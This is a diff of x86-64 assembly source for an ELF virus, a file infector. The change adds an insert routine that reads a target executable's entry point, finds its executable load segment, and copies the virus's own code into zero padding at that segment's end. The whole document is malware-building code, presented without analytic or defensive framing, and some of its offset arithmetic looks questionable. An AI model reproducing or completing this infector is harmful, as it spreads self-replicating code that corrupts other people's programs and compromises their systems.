@@ -140,6 +140,8 @@ process:                                                         ; expecting fil
                 cmp         rax, 1
                 jnz         .unmap
 
+                call        insert
+
 
 .unmap:         mov         rdi, [rel infect_mem]
                 mov         rsi, [rel infect_fsize]
@@ -162,15 +164,53 @@ is_valid_elf64:                                                 ; expecing data 
                 cmp         qword [rdi], rdx
                 jnz         .return
 .continue:      mov         rdx, ELF64_ET_DYN
-                cmp         qword [rdi + 16], rdx
+                cmp         qword [rdi + 0x10], rdx
                 jz          .ok
                 mov         rdx, ELF64_ET_EXEC
-                cmp         qword [rdi + 16], rdx
+                cmp         qword [rdi + 0x10], rdx
                 jnz         .return
 .ok:            inc         rax
 .return:        ret
 
 insert:                                                         ; expecting data in rdi
+                mov         rbx, qword [rdi + 0x18]             ; entry point
+                mov         [rel entry], rbx
+                mov         rax, qword [rdi + 0x20]             ; e_phoff
+                movzx       rcx, word [rdi + 0x38]              ; e_phnum
+                add         rdi, rax                            ; rdi = *Elf64_Phdr
+.segment:       cmp         rcx, 0
+                jle         .return
+                mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
+                cmp         rax, qword [rdi]
+                jnz         .next
+                mov         rax, qword [rdi + 8]                ; p_offset
+                mov         rdx, qword [rdi + 0x10]             ; p_vaddr
+                add         rax, rdx
+                cmp         rbx, rax
+                jb          .next
+                add         rax, qword [rdi + 0x20]             ; p_vaddr + p_offset + p_filesz
+                cmp         rbx, rax
+                jae         .next
+                sub         rax, rdx
+                mov         rdi, [rel infect_mem]
+                add         rdi, rax
+                mov         rsi, rdi                            ; save: end of segment
+                xor         al, al
+                mov         rcx, _finish - _start
+                repz        scasb
+                test        rcx, rcx
+                ja          .return                             ; not enough room
+                lea         rdi, [rel _start]
+                xchg        rdi, rsi
+                mov         rcx, _finish - _start
+                repnz       movsb
+                jmp         .return
+
+.next:          add         rdi, 0x38                           ; sizeof(Elf64_Phdr)
+                dec         rcx
+                jmp         .segment
+
+.return:        ret
 
 
 directory_fd    dq          -1
